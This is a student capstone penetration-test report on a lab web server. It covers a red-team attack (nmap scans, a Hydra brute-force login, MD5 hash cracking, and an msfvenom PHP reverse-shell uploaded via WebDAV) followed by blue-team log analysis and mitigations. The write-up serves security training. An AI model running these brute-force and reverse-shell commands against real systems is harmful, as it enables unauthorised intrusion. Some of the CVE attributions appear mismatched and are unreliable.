# Capstone Engagement #
### Assessment, Analysis, and Hardening of a Vulnerable System ###
#### Author: Exton Howard ####
#### July 15, 2021 ####

## High Level Summary ##

The Red Team is tasked with performing network scans, finding any vulnerabilities that are present and exploitable on the Capstone Apache Web Server, and then exploiting thos vulnerabilities to find a target file on the machine called flag.txt that is located somewhere on the machine. After the Red Team exploits the machine, the Blue Team is tasked with performing analysis on the logs to determine what the Red Team did and then determine mitigation and hardening strategies for the vulnerabilities exploited by the Red Team.

## Network Topology ##

| IP | Machine |
| :---: | :---: |
| 192.168.1.1 | Hyper-V |
| 192.168.1.90 | Kali |
| 192.168.1.100 | Elastic Stack (ELK) |
| 192.168.1.105 | Capstone |

![alt text](/Network_Topology.png "Network Topology")


## Red Team - Penetration Test ##

Scanned the network using nmap

```
nmap -sS -O -PN 192.168.1.0/24
```

Discovered 4 machines (listed above) and immediately disrgarded 192.168.1.1 as it was the Hyper-V gateway and 192.168.1.90 as it was my attacking Kali Linux machine

Found a machine at 192.168.1.105 which appeared to be a web server and piqued my interest. Ran a second nmap scan at that specific machine top confirm it was the target

```
nmap -sV -O 192.168.1.105
```

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt_NMAP.JPG "nmap scan")

Determined this machine is a web server with ports 22 & 80 exposed. Port 22 is running OpenSSH version 7.6p1 and port 80 is running Apache version 2.4.29. Since a webserver is up, Opened a browser and navigated to 192.168.1.105 to see what was there. Found a webserver with a list of directories. Performed cursory research into each directory and found reference to a `/company_folders/secret_folder/` that is not supposed to be exposed to the public. Typed `http://192.168.1.105/company_folders/secret_folder/` to see what I could find. A login screen pops up and states "For Ashton's eyes only". This identifies the most likely admin for the secret folder. No luck. Navigated to `meet_our_team` and read the files about the team, specifically Ashton. Nothing jumped out. Returned to the secret folder.

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt_webserver.JPG "Web Server")

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt_secret_folder.JPG "Secret Folder Login")

Now to enter the secret folder. Attempted no credentials, no password, and a couple of very basic passwords. Since no credentials were determined, will need to attempt a Brute Force attack using Hydra. Hydra ran with the rockyou.txt wordlist and after a short amount of times, returned ashtons login credentials.

```
hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder -t 40
```

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt_Hydra1.JPG "Ashton's login credentials")

Now to login to the Secret Folder & see what's there. Logging in allowed me to find a file called `connect_to_corp_server` and inside I found directions to a WebDAV server along with a new user name (Ryan) and a password hash. At a glance, the hash appears to be MD5. Ran Hash Identifier to confirm it is MD5. Used crackstation.net to see if it is easily cracked in their database or if more powerful cracking needed to be done. Crackstation.net returned the credentials and confirmed it was an unsalted MD5 hash.

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt_secret_file1.JPG "connect-to_corp_server")

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt_hash_id1.JPG "Hash-Identifier")

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt_crackstation1.JPG "crackstation.net")

Followed the directions to gain access to the WebDAV server & logged in with Ryan's credentials. Found the WebDAV had remote unrestricted upload permissions. Crafted a payload using MSFVenom to create a PHP reverse shell and uploaded into the WebDAV directory.

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 > exploit.php
```

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt_webdav_connection.JPG "WebDAV directory")

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt_msfvenom_payload_reverse_shell.JPG "MSFVenom Payload")

Uploaded the payload, deployed a listener in Metasploit, then detonated the payload. Gained a Meterpreter session

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt_meterpreter_session.JPG "Meterpreter session")

Dropped into a full shell, located the target file, and read out the flag.

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt_shell.JPG "Shell")

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/rt_flag1.JPG "Flag")


## Blue Team - Analysis of Attack ##

With the Red Team engagement now complete, the Blue Team used the Elastic Stack (ELK) located at 192.168.1.100 and the beats packages (filebeat, metricbeat, and packetbeat) that were installed on the target machine at 192.168.1.105 to perform analysis of the attack and identify the indicators of attack.

The first indicator of attack was a Port Scan that was conducted on July 1, 2021 at 10:21:10 pm. In the span of less than a second there were 1000 packets recieved and then returned to a machine. Upon further investigation, the destination ports were all different. Additionally, all of the packets came from the same IP address of 192.168.1.90. This is a clear indication that someone is scanning all ports

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/bt_nmap_scan.JPG "nmap scan")

After the port scan, when narrowing the time frame, found someone had accessed `http://192.168.1.105/company_folders/secret_folder`. This is a folder that is not supposed to be accessed. There were 16,412 total packets sent to the secret_folder and most of them had a HTTP response code of 401, which is unautorized. This is a clear indication of a Brute Force attack. The user agent for these attacks was Mozilla/4.0 (Hydra) which is a brute force attack tool. Also found that the file `http://192.168.1.105/company_folders/secret_folder/connect_to_corp_server` was accessed which means that the Brute Force Attack was successful. 

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/bt_secret_folder_access1.JPG "Access of Secret Folder")

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/bt_secret_folder_access2.JPG "Access of Secret Folder")

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/bt_hydra.JPG "Brute Force Attack")

After consulting the file located in the secret folder, determined that the file contained instructions and credentials to the WebDAV directory. Searched and found that someone had accessed the WebDAV directory from IP address 192.168.1.90. Tha attacker uploaded or accessed multiple files in the directory.

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/bt_webdav_visulation.JPG "WebDAV access")

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/bt_webdav_files.jpg "WebDAV files")

Upon further inspection of the files in the WebDAV directory, found one of the files called out and connected to a meterpreter session to give the attacker a shell to continue their attack. At this point, the attacker has significant access to the machine.

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/bt_Meterpreter_connection1.JPG "TCP shell connection")

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/bt_Meterpreter_connection2.JPG "TCP shell connection")

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/bt_Meterpreter_traffic.JPG "Meterpreter traffic")


## Vulnerabilities & Mitigation ##

Several vulnerabilities were discovered during the completetion of this excercise. Per the customer request, the team had to identify and offer mitigation strategies for the more critical vulnerabilities.

### Sensitive Data Exposure ###
During the assessment, the Red Team found open ports with sensitive company data exposed to the internet. The data including a hidden directory and a WebDAV directory as well as login credentials with a hashed password. All of this was used during the engagement.

Mitigation
* Set an alarm to notify the SOC if more than 25 scans of ports other than 80 & 443 occur in under 5 minutes
* Minimize the ports that are exposed to the internet
* Set strict alarms to alert your SOC on any ports that are open to the internet
* Limit the effectiveness of port scans with by setting firewall rules to auto-deny ICMP scans & not send responses
* If ports other than 80 or 443 must be exposed on a web server, implement TCP wrapping & firewall rules to auto-deny any IP that is not specifically whitelisted
* On any login portal, do not have the admins name listed in a note for anyone to see. This is currently the case on the login portal for the hidden directory

### Security Misconfiguration: Brute Force Vulnerability ###

The Red Team found a login portal that gave away the username for the admin of the directory. This was 50% of the information needed for them to successfully perform a dictionary brute force attack to gain access.

Mitigation
* Set an alarm to notify the SOC if mrore than 10 HTTP 401 response codes are on the same account in under 10 minutes
* Set a user policy that locks out the account for 30 minutes after 10 failed login attempts
* Enable 2-factor authentication on all accounds
* Enable a random 1-3 second delay on password validation to slow down any brute force attacks
* If more than 20 failed login attempts from the same IP address occurs sitewide within 10 minutes, blacklist that IP until it can be reviewed

### Security Misconfiguration: Unrestricted File Upload ###

The Red Team found that when they gained access to the WebDAV directory through compromised credentials that they had unrestricted access to upload any kind of files. They used this to upload a malicious file that then called back to their C2 infrastructure and allowed them to gain shell access to the system.

Mitigation
* Set an alarm to notify the SOC anytime an IP address attempts to access the WebDAV directory that is not a specific whitelisted IP addresses
* Do not have this directory exposed to the internet
* Set a firewall rule to default-deny any IP addresses that aren't on the whitelist
* Apply 2-factor authenitcation to any login of the WebDAV directory
* Require strong & complex passwords for every user that has access to the WebDAV directory
* Set WebDAV to read only if not onsite at the company

### CVE-2019-6579: Port 80 open with public access ###

The Red Team found that they could gain access to the web server through unencrypted HTTP communication on port 80.

Mitigation
* Close port 80 to the internet & only allow traffic using HTTP over TLS on port 443

#### CVE-2015-8562: Joomla Remote Code Execution Vulnerability ###

The Red Team's malicious payload contained PHP code which allowed them to abuse the HTTP user-Agent Header and execute commands, specifically calling back to the C2 infrastructure and gaining shell access to the machine.

Mitigation
* Upgrade Joomla to the latest version

### Local File Inclusion ###

The Red Team was able to gain access to sensitive information, including credentials and the target file. The Red Team was also able to access directories that were clearly marked as not being intended to be exposed to the internet.

Mitigation
* Apply a whitelist of accecpt file names
* Use a identifier that is not the file name to access the files & auto-reject any that contain an invalid identifier
* Apply strict permissions to directories and only give access to registered users
* Remove all references of directories not exposed from material that is designed to be exposed. There were multiple references to the hidden directory available on the web server

### Unsalted Hashed Passwords ###

The Red Team obtained a password hash during the engagement. An open source tool was able to quickly break the hash and allowed the Red Team to gain login credentials

Mitigation
* Restirct files with password hashes to admin level accounts
* Do not have any files that contain password hashes exposed to the internet
* Salt all hashes

### Weak Passwords ###

The Red Team found that both the password they were able to Brute Force and the hashed password they were able to crack were short and not complex.

Mitigation
* Require all passwords to contain a minimum of 10 characters
* Require all passwords to contain at minimum 1 capital letter
* Require all passwords to contain at minimum 1 special character (!, %, *, etc)
* Require all passwords not be commonly used words, employees names, company names, or in the dictionary

### Outdated Apache Version ###

The Red Team found the version of Apache to be running was 2.4.29 which has numerous known vulnerabilities for Remote Code Execution, Buffer or Heap Overflow attacks, and numerous other issues that are considered critical and exploitable.

Mitigation
* Upgrade to Apache 2.4.46


## Conclusion ##

During the engagement, the Red Team was able to find and exploit several critical vulnerabilities to gain shell access to the target web server on he way locating the target file. The Blue Team was able to determine the Indicators of Attack and Compromise. This assessment determines that the majority of the vulnerabilities with this web server are due to security misconfigurations and software that is not updated.
